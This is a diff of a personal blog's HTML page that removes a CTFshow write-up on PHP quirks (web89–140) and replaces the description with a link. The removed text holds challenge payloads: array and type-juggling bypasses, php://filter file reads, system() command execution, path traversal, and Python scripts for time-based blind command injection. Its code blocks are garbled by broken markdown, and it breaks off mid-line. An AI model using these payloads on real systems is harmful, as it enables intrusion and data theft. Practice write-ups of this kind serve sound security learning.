@@ -16,15 +16,15 @@
   <meta name="author" content="John Doe">
   <meta name="keywords" content="">
   
-    <meta name="description" content="CTFshow WriteUps WEB入门 php特性web89 intval函数：如果他的值为一个数组，只要数组里有值，不论数量，返回1，空数组返回0  preg_match()函数可以用数组绕过  &#96;&#96;&#96;&#x2F;?num[]&#x3D;1 1234567### web90- 进制绕过- &#96;&#96;&#96;  &#x2F;?num&#x3D;010574  web91 m的意思是多行匹配  &amp;#9">
+    <meta name="description" content="http:&#x2F;&#x2F;118.178.126.49&#x2F;blogs&#x2F;CTF_show_Web入门_php特性.html">
 <meta property="og:type" content="article">
 <meta property="og:title" content="CTF_show_Web入门_php特性">
 <meta property="og:url" content="http://example.com/2022/07/16/CTF_show_Web%E5%85%A5%E9%97%A8_php%E7%89%B9%E6%80%A7/index.html">
 <meta property="og:site_name" content="luelueking的ctf之路">
-<meta property="og:description" content="CTFshow WriteUps WEB入门 php特性web89 intval函数：如果他的值为一个数组，只要数组里有值，不论数量，返回1，空数组返回0  preg_match()函数可以用数组绕过  &#96;&#96;&#96;&#x2F;?num[]&#x3D;1 1234567### web90- 进制绕过- &#96;&#96;&#96;  &#x2F;?num&#x3D;010574  web91 m的意思是多行匹配  &amp;#9">
+<meta property="og:description" content="http:&#x2F;&#x2F;118.178.126.49&#x2F;blogs&#x2F;CTF_show_Web入门_php特性.html">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2022-07-16T11:34:59.000Z">
-<meta property="article:modified_time" content="2022-07-16T02:23:53.343Z">
+<meta property="article:modified_time" content="2022-08-10T12:11:05.700Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary_large_image">
   
@@ -218,7 +218,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          10k 字
+          53 字
         
       </span>
     
@@ -229,7 +229,7 @@
         
         
         
-          86 分钟
+          1 分钟
         
       </span>
     
@@ -272,232 +272,7 @@
             
               <div class="markdown-body">
                 
-                <h1 id="CTFshow-WriteUps"><a href="#CTFshow-WriteUps" class="headerlink" title="CTFshow WriteUps"></a>CTFshow WriteUps</h1><hr>
-<h2 id="WEB入门"><a href="#WEB入门" class="headerlink" title="WEB入门"></a>WEB入门</h2><hr>
-<h2 id="php特性"><a href="#php特性" class="headerlink" title="php特性"></a>php特性</h2><h3 id="web89"><a href="#web89" class="headerlink" title="web89"></a>web89</h3><ul>
-<li><p>intval函数：如果他的值为一个数组，只要数组里有值，不论数量，返回1，空数组返回0</p>
-</li>
-<li><p>preg_match()函数可以用数组绕过</p>
-</li>
-<li><p>&#96;&#96;&#96;<br>&#x2F;?num[]&#x3D;1</p>
-<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs clean"><br>### web90<br><br>- 进制绕过<br><br>- ```<br>  /?num=<span class="hljs-number">010574</span><br></code></pre></td></tr></table></figure></li>
-</ul>
-<h3 id="web91"><a href="#web91" class="headerlink" title="web91"></a>web91</h3><ul>
-<li><p>m的意思是多行匹配</p>
-</li>
-<li><p>&#96;&#96;&#96;<br>&#x2F;?cmd&#x3D;%0aphp</p>
-<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs clean"><br>### web92<br><br>- ```<br>  /?num=<span class="hljs-number">0x117c</span><br></code></pre></td></tr></table></figure></li>
-</ul>
-<h3 id="web93"><a href="#web93" class="headerlink" title="web93"></a>web93</h3><ul>
-<li>&#96;&#96;&#96;<br>&#x2F;?num&#x3D;010574<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs clean"><br>### web94<br><br>- ```<br>  /?num=<span class="hljs-number">4476.0</span><br></code></pre></td></tr></table></figure></li>
-</ul>
-<h3 id="web95"><a href="#web95" class="headerlink" title="web95"></a>web95</h3><ul>
-<li>&#96;&#96;&#96;<br>&#x2F;?num&#x3D;+010574<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk"><br><span class="hljs-comment">### web96</span><br><br>- ```<br>  <span class="hljs-regexp">/?u=./</span>flag.php<br></code></pre></td></tr></table></figure></li>
-</ul>
-<h3 id="web97"><a href="#web97" class="headerlink" title="web97"></a>web97</h3><ul>
-<li>&#96;&#96;&#96;<br>a[]&#x3D;1&amp;b[]&#x3D;2<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs clean"><br>### web98<br><br>- ```<br>  GET值随便传<br>  POST：	HTTP_FlAG=flag<br></code></pre></td></tr></table></figure></li>
-</ul>
-<h3 id="web99"><a href="#web99" class="headerlink" title="web99"></a>web99</h3><ul>
-<li><p>array_push()	向数组尾部插入一个或多个元素</p>
-</li>
-<li><p>file_put_contents() 写入函数</p>
-</li>
-<li><pre><code class="hljs">GET:	n=1.php
-POST:	content=&lt;?=`tac f*`;
-多试几次
-<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><br><span class="hljs-comment">### web100</span><br><br>- =的优先级高于<span class="hljs-keyword">and</span><br>- 所以只要<span class="hljs-built_in">v1</span>为true就行<br><br>- ```<br>  /?<span class="hljs-built_in">v1</span><span class="hljs-number">=1</span>&amp;<span class="hljs-built_in">v2</span><span class="hljs-symbol">=var_dump</span>($ctfshow)&amp;<span class="hljs-built_in">v3</span>=<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>
-</code></pre>
-</li>
-<li><p>flag中把0x2d换成-</p>
-</li>
-</ul>
-<h3 id="web101"><a href="#web101" class="headerlink" title="web101"></a>web101</h3><ul>
-<li><p>反射</p>
-</li>
-<li><pre><code class="hljs">/?v1=1&amp;v2=echo new Reflectionclass&amp;v3=;
-<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs dts"><br>- 最后一位爆破<br><br><span class="hljs-meta">### web102～103</span><br><br>- ```<br><span class="hljs-symbol">  GET:</span>/?v2=<span class="hljs-number">115044383959474e6864434171594473</span><span class="hljs-variable">&amp;v3</span>=php:<span class="hljs-comment">//filter/write=convert.base64-decode/resource=2.php</span><br><span class="hljs-symbol">  POST:</span>v1=hex2bin<br></code></pre></td></tr></table></figure>
-</code></pre>
-</li>
-<li><p>然后访问2.php查看源码</p>
-</li>
-<li><p>hex2bin就是把十六进制值的字符串转换为ASCII字符</p>
-</li>
-</ul>
-<h3 id="web104"><a href="#web104" class="headerlink" title="web104"></a>web104</h3><ul>
-<li>&#96;&#96;&#96;<br>GET:	v2[]&#x3D;1<br>POST:	v1[]&#x3D;1<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br><span class="hljs-comment">### web105</span><br><br>- ```<br>  GET:	<span class="hljs-attribute">suces</span>=flag<br>  POST:	<span class="hljs-attribute">error</span>=suces<br></code></pre></td></tr></table></figure></li>
-</ul>
-<h3 id="web106"><a href="#web106" class="headerlink" title="web106"></a>web106</h3><ul>
-<li><pre><code class="hljs">GET:	v2[]=1
-POST:	v1[]=2
-<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br><span class="hljs-comment">### web107</span><br><br>- ```<br>  GET:	<span class="hljs-attribute">v3</span>=240610708<br>  POST:	<span class="hljs-attribute">v1</span>=flag=0<br></code></pre></td></tr></table></figure>
-</code></pre>
-</li>
-<li><p>解释一下：240610708经过md5加密后是0e462…..</p>
-</li>
-<li><p>因为是弱类比较所以0&#x3D;&#x3D;0e</p>
-</li>
-</ul>
-<h3 id="web108"><a href="#web108" class="headerlink" title="web108"></a>web108</h3><ul>
-<li><p>ereg函数的功能是用指定的模式搜索一个字符长中指定的字符串，如果匹配成功就返回true。大小敏感。<strong>但是存在NULL漏洞</strong>，导致了正则过滤被绕过，所以可以使用%00截断正则匹配</p>
-</li>
-<li><p>strrev函数就是返还反转后的字符串</p>
-</li>
-<li><p>&#96;&#96;&#96;<br>&#x2F;?c&#x3D;a%00778</p>
-<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs clean"><br>### web109<br><br>- Exception是所以异常的基类<br><br>- ```<br>  /?v1=exception&amp;v2=<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>)<br>  /?v1=exception&amp;v2=<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;tac f*&#x27;</span>)<br></code></pre></td></tr></table></figure></li>
-</ul>
-<h3 id="web110"><a href="#web110" class="headerlink" title="web110"></a>web110</h3><ul>
-<li><p>FilesystemIterator 遍历文件类</p>
-</li>
-<li><p>getcwd 取得当前工作目录</p>
-</li>
-<li><p>组合在一起默认只显示第一个文件</p>
-</li>
-<li><p>&#96;&#96;&#96;<br>&#x2F;?v1&#x3D;FilesystemIterator&amp;v2&#x3D;getcwd</p>
-<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs clean"><br>- 访问fl36dga.txt<br><br>### web111<br><br>- ```<br>  v1=ctfshow&amp;v2=GLOBALS<br></code></pre></td></tr></table></figure></li>
-</ul>
-<h3 id="web112"><a href="#web112" class="headerlink" title="web112"></a>web112</h3><ul>
-<li>&#96;&#96;&#96;<br>&#x2F;?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;flag.php<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs clean"><br>### web113<br><br>- ```<br>  /?file=compress.zlib:<span class="hljs-comment">//flag.php</span><br>  读取压缩流<br></code></pre></td></tr></table></figure></li>
-</ul>
-<h3 id="web114"><a href="#web114" class="headerlink" title="web114"></a>web114</h3><ul>
-<li><pre><code class="hljs">/?file=php://filter/resource=flag.php
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-comment">### web115</span><br><br>- 需要满足条件：<br>  - 通过is_numeric的检测<br>  - 不等于<span class="hljs-number">36</span><br>  - 去空后依旧不等于<span class="hljs-number">36</span><br>  - 经过过滤方法后等于<span class="hljs-number">36</span><br><br>- fluzz脚本<br><br>- ```php<br>  <span class="hljs-meta">&lt;?php</span><br>  <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-number">129</span>;<span class="hljs-variable">$i</span>++)&#123;<br>  	<span class="hljs-variable">$num</span>=<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$i</span>).<span class="hljs-string">&#x27;36&#x27;</span>;<br>  	<span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$num</span>)!==<span class="hljs-string">&#x27;36&#x27;</span>&amp;&amp;<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$num</span>) &amp;&amp; <span class="hljs-variable">$num</span>!==<span class="hljs-string">&#x27;36&#x27;</span>)&#123;<br>  		<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$i</span>)).<span class="hljs-string">&quot;\n&quot;</span>;<br>  	&#125;<br>  &#125;<br>  <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
-</code></pre>
-</li>
-<li><p>&#96;&#96;&#96;<br>%0C36</p>
-<figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><br>### web123<br><br>- php特性：在php中变量是由数字和下划线组成的，所以不论用post还是<span class="hljs-keyword">get</span>传入变量参数的时候都将空格、+、点、[转换为下划线，但是使用一个特性是可以绕过的，就是当[提前出现后，后面的点就不会再被转义了，例：CTF[SHOW.COM ===&gt; CTF_SHOW.COM<br><br>- ```<br>  POST:	CTF_SHOW=<span class="hljs-number">1</span>&amp;CTF[SHOW.COM=<span class="hljs-number">1</span>&amp;<span class="hljs-function"><span class="hljs-keyword">fun</span>=echo $flag</span><br></code></pre></td></tr></table></figure></li>
-</ul>
-<h3 id="web125"><a href="#web125" class="headerlink" title="web125"></a>web125</h3><ul>
-<li><pre><code class="hljs">POST:	CTF_SHOW=6&amp;CTF[SHOW.COM=6&amp;fun=highlight_file($_GET[1])
-GET:	1=flag.php
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-comment">### web126</span><br><br>```php<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-variable">$a</span>=<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;argv&#x27;</span>];<br><span class="hljs-variable">$c</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;fun&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;CTF_SHOW&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;CTF_SHOW.COM&#x27;</span>])&amp;&amp;!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;fl0g&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print/i&quot;</span>, <span class="hljs-variable">$c</span>)&amp;&amp;<span class="hljs-variable">$c</span>&lt;=<span class="hljs-number">16</span>)&#123;<br>         <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;<span class="hljs-subst">$c</span>&quot;</span>.<span class="hljs-string">&quot;;&quot;</span>);<br>         <span class="hljs-keyword">if</span>(<span class="hljs-variable">$fl0g</span>===<span class="hljs-string">&quot;flag_give_me&quot;</span>)&#123;<br>             <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>         &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
-</code></pre>
-</li>
-<li><p>先给payload</p>
-</li>
-<li><p>&#96;&#96;&#96;<br>GET:	$fl0g&#x3D;flag_give_me<br>POST:	CTF_SHOW&#x3D;6&amp;CTF[SHOW.COM&#x3D;6&amp;fun&#x3D;assert($a[0])</p>
-<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><br>- 解释一下：<br><br>  - GET传参中传的是<span class="hljs-variable">$fl0g</span>不是fl0g所以可以绕过isset<br><br>  - assert断言函数，如果里面传字符串，会被当作PHP代码执行<br><br>  - ```<br>    <span class="hljs-variable">$a</span><span class="hljs-selector-attr">[0]</span>=$_SERVER<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;argv&#x27;</span>]</span><span class="hljs-selector-attr">[0]</span>=$_SERVER<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>]</span>=&gt;<span class="hljs-variable">$fl0g</span>=flag_give_me<br></code></pre></td></tr></table></figure>
-
-<ul>
-<li><p>&#96;&#96;&#96;<br>$_SERVER[‘argv’]：</p>
-<p>1、cli模式（命令行）下</p>
-<pre><code class="hljs">第一个参数$_SERVER[&#39;argv&#39;][0]是脚本名，其余的是传递给脚本的参数
-</code></pre>
-<p>2、web网页模式下</p>
-<pre><code class="hljs">在web页模式下必须在php.ini开启register_argc_argv配置项
-
-设置register_argc_argv = On(默认是Off)，重启服务，$_SERVER[‘argv’]才会有效果
-
-这时候的$_SERVER[‘argv’][0] = $_SERVER[‘QUERY_STRING’]
-
-$argv,$argc在web模式下不适用
-</code></pre>
-<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs clean"><br>### web127<br><br>- ```<br>  /?ctf show=ilove36d<br></code></pre></td></tr></table></figure></li>
-</ul>
-</li>
-</ul>
-<h3 id="web128"><a href="#web128" class="headerlink" title="web128"></a>web128</h3><ul>
-<li>&#96;&#96;&#96;<br>call_user_func:	把第一个参数当作回掉函数用<br>知识点：_()是一个函数<br>_()&#x3D;&#x3D;gettext()是gettext()的扩展函数，开启text扩展，需要php扩展目录下有php_gettext.dll<br>get_defined_vars():返回由所有已定义变量组成的数组<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><br>- ```<br>  /?<span class="hljs-built_in">f1</span><span class="hljs-symbol">=_</span>&amp;<span class="hljs-built_in">f2</span><span class="hljs-symbol">=get_defined_vars</span><br></code></pre></td></tr></table></figure></li>
-</ul>
-<h3 id="web129"><a href="#web129" class="headerlink" title="web129"></a>web129</h3><ul>
-<li>&#96;&#96;&#96;<br>&#x2F;?f&#x3D;&#x2F;ctfshow&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php<figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><br><span class="hljs-comment">### web130</span><br><br><span class="hljs-bullet">-</span> <span class="hljs-string">数组绕过</span><br><br><span class="hljs-bullet">-</span> <span class="hljs-string">```</span><br>  <span class="hljs-attribute">POST</span><span class="hljs-punctuation">:</span> <span class="hljs-string">f[]=666</span><br></code></pre></td></tr></table></figure></li>
-</ul>
-<h3 id="web131"><a href="#web131" class="headerlink" title="web131"></a>web131</h3><ul>
-<li><p>不知道为什么这次不能数组绕过了</p>
-</li>
-<li><p>回溯次数限制绕过</p>
-</li>
-<li><p>&#96;&#96;&#96;python<br>import requests<br>url&#x3D;”<a target="_blank" rel="noopener" href="http://04e1d5d4-1233-40e9-aa80-51a9a75459ea.challenge.ctf.show/&quot;">http://04e1d5d4-1233-40e9-aa80-51a9a75459ea.challenge.ctf.show/&quot;</a><br>data&#x3D;{<br>‘f’:’very’*250000+’36Dctfshow’<br>}<br>r&#x3D;requests.post(url,data&#x3D;data)<br>print(r.text)</p>
-<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs clean"><br>### web132<br><br>- 访问robots<br><br>- 访问admin<br><br>- ```<br>  /?username=admin&amp;password=<span class="hljs-number">1</span>&amp;<span class="hljs-keyword">code</span>=admin<br></code></pre></td></tr></table></figure></li>
-</ul>
-<h3 id="web133"><a href="#web133" class="headerlink" title="web133"></a>web133</h3><ul>
-<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_46091464/article/details/109095382">https://blog.csdn.net/qq_46091464/article/details/109095382</a></li>
-<li>长见识</li>
-</ul>
-<h3 id="web134"><a href="#web134" class="headerlink" title="web134"></a>web134</h3><ul>
-<li><p>&#96;&#96;&#96;<br>parse_str()–将字符串解析成多个变量；如果 string 是 URL 传递入的查询字符串（query string），则将它解析为变量并设置到当前作用域</p>
-<p>extract()–从数组中将变量导入到当前的符号表，将键名当作变量名，值作为变量的值（默认覆盖）</p>
-<p>注意两个的区别：</p>
-<p>extract是将数组中元素分解,执行后数组的key值作为变量名，数组的value赋值给对应Key的变量，这样可以直接通过Key变量去访问，不用数组加key去访问。</p>
-<p>即：从数组中创建变量</p>
-<p>parse_str是根据”&#x3D;”来分解字符串，主要用于对url参数的解析。</p>
-<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><br>- ```<br>  /?_POST[key1]=<span class="hljs-number">36</span>d&amp;_POST[key2]=<span class="hljs-number">36</span>d<br></code></pre></td></tr></table></figure></li>
-</ul>
-<h3 id="web135"><a href="#web135" class="headerlink" title="web135"></a>web135</h3><ul>
-<li>&#96;&#96;&#96;<br>&#x2F;?F&#x3D;<code>$F</code> ;cp flag.php 666.txt<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br><span class="hljs-comment">### web136</span><br><br>- ```<br>  ?c=<span class="hljs-built_in">ls</span> \|<span class="hljs-built_in">tee</span> 1<br>  //将根目录下的内容写入1<br>  访问1，下载文件发现f149_15_h3r3<br>  ?c=<span class="hljs-built_in">nl</span> /f149_15_h3r3|<span class="hljs-built_in">tee</span> 1<br>  访问1，下载文件得flag<br></code></pre></td></tr></table></figure></li>
-</ul>
-<h3 id="web137"><a href="#web137" class="headerlink" title="web137"></a>web137</h3><ul>
-<li>&#96;&#96;&#96;<br>POST:	ctfshow&#x3D;ctfshow::getFlag<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs clean"><br>### web138<br><br>- ```<br>  POST:	ctfshow[<span class="hljs-number">0</span>]=ctfshow&amp;ctfshow[<span class="hljs-number">1</span>]=getFlag<br></code></pre></td></tr></table></figure></li>
-</ul>
-<h3 id="web139"><a href="#web139" class="headerlink" title="web139"></a>web139</h3><ul>
-<li><p>获取文件名脚本</p>
-</li>
-<li><p>&#96;&#96;&#96;python<br>import requests<br>import time<br>import string<br>str&#x3D;string.ascii_letters+string.digits	#生成所有字母与数字[a-zA-Z0-9]<br>result&#x3D;””<br>for i in range(1,5):<br>key&#x3D;0<br>for j in range(1,15):<br>    if key&#x3D;&#x3D;1:<br>        break<br>    for n in str:<br>        payload&#x3D;”if [ <code>ls /|awk &#39;NR==&#123;0&#125;&#39;|cut -c &#123;1&#125;</code> &#x3D;&#x3D; {2} ];then sleep 3;fi”.format(i,j,n)<br>        #print(payload)<br>        url&#x3D;”<a target="_blank" rel="noopener" href="http://9147392b-f7b0-40d9-b327-bcf91149507e.challenge.ctf.show/?c=&quot;+payload">http://9147392b-f7b0-40d9-b327-bcf91149507e.challenge.ctf.show/?c=&quot;+payload</a><br>        try:<br>            requests.get(url,timeout&#x3D;(2.5,2.5))<br>        except:<br>            result&#x3D;result+n<br>            print(result)<br>            break<br>        if n&#x3D;&#x3D;’9’:<br>            key&#x3D;1<br>result+&#x3D;” “</p>
-<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br>- 读取文件内容脚本<br><br>- ```python<br>  import requests<br>  import time<br>  import string<br>  <span class="hljs-attribute">str</span>=string.digits+string.ascii_lowercase+&quot;-&quot;#获取小写字母与数字<br>  <span class="hljs-attribute">result</span>=<span class="hljs-string">&quot;&quot;</span><br>  <span class="hljs-attribute">key</span>=0<br>  <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(1,45):<br>  	<span class="hljs-built_in">print</span>(j)<br>  	<span class="hljs-keyword">if</span> <span class="hljs-attribute">key</span>==1:<br>  		break<br>  	<span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> str:<br>  		<span class="hljs-attribute">payload</span>=<span class="hljs-string">&quot;if [ `cat /f149_15_h3r3|cut -c &#123;0&#125;` == &#123;1&#125; ];then sleep 3;fi&quot;</span>.format(j,n)<br>  		#<span class="hljs-built_in">print</span>(payload)<br>  		<span class="hljs-attribute">url</span>=<span class="hljs-string">&quot;http://9147392b-f7b0-40d9-b327-bcf91149507e.challenge.ctf.show/?c=&quot;</span>+payload<br>  		try:<br>  			requests.<span class="hljs-built_in">get</span>(url,timeout=(2.5,2.5))	#time()第一个参数是响应时间，第二个是读取时间<br>  		except:<br>  		    <span class="hljs-attribute">result</span>=result+n<br>  		    <span class="hljs-built_in">print</span>(result)<br>  		    break<br></code></pre></td></tr></table></figure></li>
-</ul>
-<h3 id="web140"><a href="#web140" class="headerlink" title="web140"></a>web140</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br> <br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;f1&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;f2&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$f1</span> = (String)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;f1&#x27;</span>];<br>    <span class="hljs-variable">$f2</span> = (String)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;f2&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^[a-z0-9]+$/&#x27;</span>, <span class="hljs-variable">$f1</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span 